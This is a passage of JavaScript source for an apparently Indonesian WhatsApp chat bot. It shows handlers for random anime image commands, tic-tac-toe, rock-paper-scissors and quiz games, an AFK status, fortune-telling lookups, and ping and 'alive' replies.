if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/tsunade.json')
if (/waifu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/waifu.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)];
ryozingod.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break

case 'ttc':
case 'ttt':
case 'tictactoe': {
    inireact()
    let TicTacToe = require("./lib/tictactoe");
    this.game = this.game ? this.game : {};
    if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return xgreply('Kamu masih didalam game');
    let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true));
    if (room) {
        xgreply('Partner ditemukan!');
        room.o = m.chat;
        room.game.playerO = m.sender;
        room.state = 'PLAYING';
        let arr = room.game.render().map(v => {
            return {
                X: `❌`,
                O: `⭕`,
                1: `1️⃣`,
                2: `2️⃣`,
                3: `3️⃣`,
                4: `4️⃣`,
                5: `5️⃣`,
                6: `6️⃣`,
                7: `7️⃣`,
                8: `8️⃣`,
                9: `9️⃣`,
            }[v];
        });
        let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`;
        if (room.x !== room.o) await ryozingod.sendText(room.x, str, m, {
            mentions: parseMention(str)
        });
        await ryozingod.sendText(room.o, str, m, {
            mentions: parseMention(str)
        });
    } else {
        room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
        };
        if (text) room.name = text;
        xgreply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''));
        this.game[room.id] = room;
    }
}
break
case 'delttc':
case 'delttt': {
    inireact()
    this.game = this.game ? this.game : {};
    try {
        if (this.game) {
            delete this.game;
            ryozingod.sendText(m.chat, `Berhasil delete session TicTacToe`, m);
        } else if (!this.game) {
            xgreply(`Session TicTacToe🎮 tidak ada`);
        } else mewReply('?');
    } catch (e) {
        xgreply('rusak');
    }
}
break;
case 'suitpvp':
case 'suit': {
    inireact()
    this.suit = this.suit ? this.suit : {};
    let poin = 10;
    let poin_lose = 10;
    let timeout = 60000;
    if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) xgreply(`Selesaikan suit mu yang sebelumnya`);
    if (m.mentionedJid[0] === m.sender) return xgreply(`Tidak bisa bermain dengan diri sendiri !`);
    if (!m.mentionedJid[0]) return xgreply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${_owner[1]}`, m.chat, {
        mentions: [_owner[1] + '@s.whatsapp.net']
    });
    if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return xgreply(`Orang yang kamu tantang sedang bermain suit bersama orang lain :(`);
    let id = 'suit_' + new Date() * 1;
    let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`;
    this.suit[id] = {
        chat: await ryozingod.sendText(m.chat, caption, m, {
            mentions: parseMention(caption)
        }),
        id: id,
        p: m.sender,
        p2: m.mentionedJid[0],
        status: 'wait',
        waktu: setTimeout(() => {
            if (this.suit[id]) ryozingod.sendText(m.chat, `_Waktu suit habis_`, m);
            delete this.suit[id];
        }, 60000),
        poin,
        poin_lose,
        timeout
    };
}
break;
case 'kuismath':
case 'math': {
    inireact()
    if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return xgreply("Masih Ada Sesi Yang Belum Diselesaikan!");
    let {
        genMath,
        modes
    } = require('./lib/math.js');
    if (!text) return xgreply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh _useran: ${prefix}math medium`);
    let result = await genMath(text.toLowerCase());
    ryozingod.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
        kuismath[m.sender.split('@')[0]] = result.jawaban;
    });
    await sleep(result.waktu);
    if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
        console.log("Jawaban: " + result.jawaban);
        xgreply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]]);
        delete kuismath[m.sender.split('@')[0]];
    }
}
break;
case 'tebak': {
    inireact()
    if (args[0] === 'gambar') {
        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return xgreply("Masih Ada Sesi Yang Belum Diselesaikan!");
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json');
        let result = anu[Math.floor(Math.random() * anu.length)];
        ryozingod.sendMessage(m.chat, {
            image: {
                url: result.img
            },
            caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`
        }, {
            quoted: m
        }).then(() => {
            tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
        });
        await sleep(60000);
        if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
            console.log("Jawaban: " + result.jawaban);
            ryozingod.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}`, m);
            delete tebakgambar[m.sender.split('@')[0]];
        }
    } else if (args[0] === 'kata') {
        if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return xgreply("Masih Ada Sesi Yang Belum Diselesaikan!");
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json');
        let result = anu[Math.floor(Math.random() * anu.length)];
        ryozingod.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
            tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
        });
        await sleep(60000);
        if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
            console.log("Jawaban: " + result.jawaban);
            ryozingod.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}`, m);
            delete tebakkata[m.sender.split('@')[0]];
        }
     } else if (args[0] === 'kalimat') {
        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return xgreply("Masih Ada Sesi Yang Belum Diselesaikan!");
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json');
        let result = anu[Math.floor(Math.random() * anu.length)];
        ryozingod.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
            tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
        });
        await sleep(60000);
        if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
            console.log("Jawaban: " + result.jawaban);
            ryozingod.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}`, m);
            delete tebakkalimat[m.sender.split('@')[0]];
        }
    } else if (args[0] === 'lirik') {
        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return xgreply("Masih Ada Sesi Yang Belum Diselesaikan!");
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json');
        let result = anu[Math.floor(Math.random() * anu.length)];
        ryozingod.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
            tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
        });
        await sleep(60000);
        if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
            console.log("Jawaban: " + result.jawaban);
            ryozingod.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}`, m);
            delete tebaklirik[m.sender.split('@')[0]];
        }
    } else if (args[0] === 'tebakan') {
        if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return xgreply("Masih Ada Sesi Yang Belum Diselesaikan!");
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json');
        let result = anu[Math.floor(Math.random() * anu.length)];
        ryozingod.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
            tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
        });
        await sleep(60000);
        if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
            console.log("Jawaban: " + result.jawaban);
            ryozingod.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktebakan[m.sender.split('@')[0]]}`, m);
            delete tebaktebakan[m.sender.split('@')[0]];
        }
    } else if (args[0] === 'bendera') {
        if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return xgreply("Masih Ada Sesi Yang Belum Diselesaikan!");
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json');
        let result = anu[Math.floor(Math.random() * anu.length)];
        ryozingod.sendMessage(m.chat, {
            image: {
                url: result.img
            },
            caption: `Silahkan Jawab Gambar Berikut\n\nClue : ${result.flag}\nWaktu : 60s`
        }, {
            quoted: m
        }).then(() => {
            tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase();
        });
        await sleep(60000);
        if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
            console.log("Jawaban: " + result.name);
            ryozingod.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera[m.sender.split('@')[0]]}`, m);
            delete tebakbendera[m.sender.split('@')[0]];
        }
    } else if (args[0] === 'bendera2') {
        if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) return xgreply("Masih Ada Sesi Yang Belum Diselesaikan!");
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json');
        let result = anu[Math.floor(Math.random() * anu.length)];
        ryozingod.sendMessage(m.chat, {
            image: {
                url: result.img
            },
            caption: `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`
        }, {
            quoted: m
        }).then(() => {
            tebakbendera2[m.sender.split('@')[0]] = result.name.toLowerCase();
        });
        await sleep(60000);
        if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) {
            console.log("Jawaban: " + result.name);
            ryozingod.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera2[m.sender.split('@')[0]]}`, m);
            delete tebakbendera2[m.sender.split('@')[0]];
        }
    } else if (args[0] === 'kabupaten') {
        if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return xgreply("Masih Ada Sesi Yang Belum Diselesaikan!");
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json');
        let result = anu[Math.floor(Math.random() * anu.length)];
        ryozingod.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
            tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase();
        });
        await sleep(60000);
        if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
            console.log("Jawaban: " + result.title);
            ryozingod.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkabupaten[m.sender.split('@')[0]]}`, m);
            delete tebakkabupaten[m.sender.split('@')[0]];
        }
    } else if (args[0] === 'kimia') {
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return xgreply("Masih Ada Sesi Yang Belum Diselesaikan!");
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json');
        let result = anu[Math.floor(Math.random() * anu.length)];
        ryozingod.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nUnsur : ${result.unsur}\nWaktu : 60s`, m).then(() => {
            tebakkimia[m.sender.split('@')[0]] = result.lambang.toLowerCase();
        });
        await sleep(60000);
        if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
            console.log("Jawaban: " + result.lambang);
            ryozingod.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkimia[m.sender.split('@')[0]]}`, m);
            delete tebakkimia[m.sender.split('@')[0]];
        }
    } else if (args[0] === 'asahotak') {
        if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) return xgreply("Masih Ada Sesi Yang Belum Diselesaikan!");
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json');
        let result = anu[Math.floor(Math.random() * anu.length)];
        ryozingod.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
            tebakasahotak[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
        });
        await sleep(60000);
        if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) {
            console.log("Jawaban: " + result.jawaban);
            ryozingod.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakasahotak[m.sender.split('@')[0]]}`, m);
            delete tebakasahotak[m.sender.split('@')[0]];
        }
    } else if (args[0] === 'siapakahaku') {
        if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) return xgreply("Masih Ada Sesi Yang Belum Diselesaikan!");
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json');
        let result = anu[Math.floor(Math.random() * anu.length)];
        ryozingod.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
            tebaksiapakahaku[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
        });
        await sleep(60000);
        if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) {
            console.log("Jawaban: " + result.jawaban);
            ryozingod.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaksiapakahaku[m.sender.split('@')[0]]}`, m);
            delete tebaksiapakahaku[m.sender.split('@')[0]];
        }
    } else if (args[0] === 'susunkata') {
        if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) return xgreply("Masih Ada Sesi Yang Belum Diselesaikan!");
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json');
        let result = anu[Math.floor(Math.random() * anu.length)];
        ryozingod.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nTipe : ${result.tipe}\nWaktu : 60s`, m).then(() => {
            tebaksusunkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
        });
        await sleep(60000);
        if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) {
            console.log("Jawaban: " + result.jawaban);
            ryozingod.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaksusunkata[m.sender.split('@')[0]]}`, m);
            delete tebaksusunkata[m.sender.split('@')[0]];
        }
    } else if (args[0] === 'tekateki') {
        if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) return xgreply("Masih Ada Sesi Yang Belum Diselesaikan!");
        let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json');
        let result = anu[Math.floor(Math.random() * anu.length)];
        ryozingod.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
            tebaktekateki[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
        });
        await sleep(60000);
        if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) {
            console.log("Jawaban: " + result.jawaban);
            ryozingod.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktekateki[m.sender.split('@')[0]]}`, m);
            delete tebaktekateki[m.sender.split('@')[0]];
        }
    }
    break
}
case 'afk':
    inireact()
    if (!isGroup) return xgreply('Only Group')
    if (isAfkOn) return xgreply("Kakak Sudah Afk Sebelumnya");
    let reason = text ? text : 'Nothing.';
    afk.addAfkUser(m.sender, Date.now(), reason, _afk);
    xgreply(`@${m.sender.split('@')[0]} Sedang AFK\nDengan Alasan : ${reason}`);
break

//Primbon
case "nomerhoki": case "nomorhoki": {
inireact()
if (!Number(text)) return xgreply(`Example : ${prefix + command} 6288292024190`) 
let anu = await primbon.nomer_hoki(Number(text))
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Nomor HP :* ${anu.message.nomer_hp}\n❋々 *Angka Shuzi :* ${anu.message.angka_shuzi}\n❋々 *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n❋々 *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
}
break
case "artimimpi": case "tafsirmimpi": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} belanja`) 
let anu = await primbon.tafsir_mimpi(text)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Mimpi :* ${anu.message.mimpi}\n❋々 *Arti :* ${anu.message.arti}\n❋々 *Solusi :* ${anu.message.solusi}`)
}
break
case "ramalanjodoh": case "ramaljodoh": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} Ryo, 7, 7, 2005, Mboh, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Nama Anda :* ${anu.message.nama_anda.nama}\n❋々 *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n❋々 *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n❋々 *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
case "ramalanjodohbali": case "ramaljodohbali": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} Ryo, 7, 7, 2005, Mboh, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Nama Anda :* ${anu.message.nama_anda.nama}\n❋々 *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n❋々 *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n❋々 *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
case "suamiistri": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} Ryo, 7, 7, 2005, Mboh, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Nama Suami :* ${anu.message.suami.nama}\n❋々 *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n❋々 *Nama Istri :* ${anu.message.istri.nama}\n❋々 *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n❋々 *Hasil :* ${anu.message.result}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
case "ramalancinta": case "ramalcinta": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} Ryo, 7, 7, 2005, Mboh, 16, 11, 2004`) 
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Nama Anda :* ${anu.message.nama_anda.nama}\n❋々 *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n❋々 *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n❋々 *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n❋々 *Sisi Positif :* ${anu.message.sisi_positif}\n❋々 *Sisi Negatif :* ${anu.message.sisi_negatif}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
case "artinama": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} Ryot`) 
let anu = await primbon.arti_nama(text)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Nama :* ${anu.message.nama}\n❋々 *Arti :* ${anu.message.arti}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
case "kecocokannama": case "cocoknama": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} Ryo, 7, 7, 2005`) 
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Nama :* ${anu.message.nama}\n❋々 *Lahir :* ${anu.message.tgl_lahir}\n❋々 *Life Path :* ${anu.message.life_path}\n❋々 *Destiny :* ${anu.message.destiny}\n❋々 *Destiny Desire :* ${anu.message.destiny_desire}\n❋々 *Personality :* ${anu.message.personality}\n❋々 *Persentase :* ${anu.message.persentase_kecocokan}`)
}
break
case "kecocokanpasangan": case "cocokpasangan": case "pasangan": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} Ryo|Mboh`) 
let [nama1, nama2] = text.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return xgreply(anu.message)
ryozingod.sendImage(m.chat,anu.message.gambar, `❋々 *Nama Anda :* ${anu.message.nama_anda}\n❋々 *Nama Pasangan :* ${anu.message.nama_pasangan}\n❋々 *Sisi Positif :* ${anu.message.sisi_positif}\n❋々 *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
}
break
case "jadianpernikahan": case "jadiannikah": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} 6, 12, 2020`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Tanggal Pernikahan :* ${anu.message.tanggal}\n❋々 *karakteristik :* ${anu.message.karakteristik}`)
}
break
case "sifatusaha": {
inireact()
if (!ext) return xgreply(`Example : ${prefix+ command} 28, 12, 2021`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Lahir :* ${anu.message.hari_lahir}\n❋々 *Usaha :* ${anu.message.usaha}`)
}
break
case "rejeki": case "rezeki": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Lahir :* ${anu.message.hari_lahir}\n❋々 *Rezeki :* ${anu.message.rejeki}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
case 'ping': {
  const startTime = new Date();
  const pingMsg = await ryozingod.sendMessage(m.chat, { text: '*𝚂𝚙𝚒𝚍𝚎𝚛*' });

 await ryozingod.relayMessage(m.chat, {
      protocolMessage: {
        key: pingMsg.key,
        type: 14,
        editedMessage: {
          conversation: `𝚂𝚙𝚒𝚍𝚎𝚛 𝚂𝙿𝙴𝙴𝙳 🕷️🕸️ *${new Date() - startTime}* 𝙼/𝚂`
        }
      }
    }, {});
  } 
break;
case "alive":

const audiovn = "./spider.mp3";
    const dooc = {
        audio: {
          url: audiovn
        },
        mimetype: 'audio/mp4',
        ptt: true,
        waveform:  [100, 0, 100, 0, 100, 0, 100],
        fileName: "",

        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
          title: "S͓̽P͓̽I͓̽D͓̽E͓̽R͓̽-M͓̽D͓̽ I͓̽S͓̽ A͓̽C͓̽T͓̽I͓̽V͓̽E͓̽ S͓̽I͓̽R͓̽ 🙌.",
          body: "https://chat.whatsapp.com/EPSGKau0IVi7J5lyOJO7Jk",
          thumbnailUrl: "https://telegra.ph/file/d78450cd45f561fa4f748.jpg",
          sourceUrl: "https://chat.whatsapp.com/EPSGKau0IVi7J5lyOJO7Jk",
          mediaType: 1,
          renderLargerThumbnail: true
          }}
      };


await ryozingod.sendMessage(m.chat, dooc, {quoted: m});


break;
case "potensipenyakit": case "penyakit": {
inireact()
if (!text) return xgreply(`Example : ${prefix + command} 7, 7, 2005`) 
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return xgreply(anu.message)
xgreply(`❋々 *Analisa :* ${anu.message.analisa}\n❋々 *Sektor :* ${anu.message.sektor}\n❋々 *Elemen :* ${anu.message.elemen}\n❋々 *Catatan :* ${anu.message.catatan}`)
}
break
case "artitarot": case "tarot": {
inireact()
